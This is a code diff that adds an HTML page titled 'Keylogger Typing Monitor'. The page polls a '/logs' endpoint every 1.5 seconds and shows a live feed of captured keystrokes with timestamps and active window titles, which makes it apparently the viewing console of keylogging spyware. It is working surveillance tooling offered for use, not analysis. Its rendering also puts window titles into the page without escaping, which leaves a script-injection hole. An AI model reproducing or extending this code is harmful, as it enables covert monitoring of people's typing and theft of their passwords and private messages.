@@ -1,0 +1,56 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <title>Keylogger Typing Monitor</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    .event { border-bottom: 1px solid #ddd; padding: 8px 0; }
+    .ts { color: #666; font-size: 0.9em; }
+    .window { font-weight: bold; }
+    #status { margin-bottom: 10px; color: green; }
+  </style>
+</head>
+<body>
+  <h1>Keylogger Typing Monitor</h1>
+  <div id="status">Connected</div>
+  <div id="feed"></div>
+
+<script>
+let lastSince = 0;
+
+function renderEvent(e){
+  const date = new Date(e.timestamp*1000).toLocaleString();
+  const div = document.createElement('div');
+  div.className = 'event';
+  div.innerHTML = `<div class="ts">${date}</div>
+                   <div class="window">${e.window}</div>
+                   <pre>${(e.text || "").replace(/</g,'&lt;')}</pre>`;
+  return div;
+}
+
+async function poll(){
+  try{
+    const res = await fetch('/logs?since=' + lastSince);
+    if(!res.ok) throw new Error('HTTP ' + res.status);
+    const data = await res.json();
+    if(data.length){
+      const feed = document.getElementById('feed');
+      for(const e of data){
+        feed.insertBefore(renderEvent(e), feed.firstChild);
+        lastSince = Math.max(lastSince, e.timestamp);
+      }
+    }
+    document.getElementById('status').textContent = 'Connected (last: ' + new Date(lastSince*1000).toLocaleString() + ')';
+  }catch(err){
+    document.getElementById('status').textContent = 'Error: ' + err.message;
+    document.getElementById('status').style.color = 'red';
+  }
+}
+
+// poll every 1.5s
+setInterval(poll, 1500);
+poll();
+</script>
+</body>
+</html>
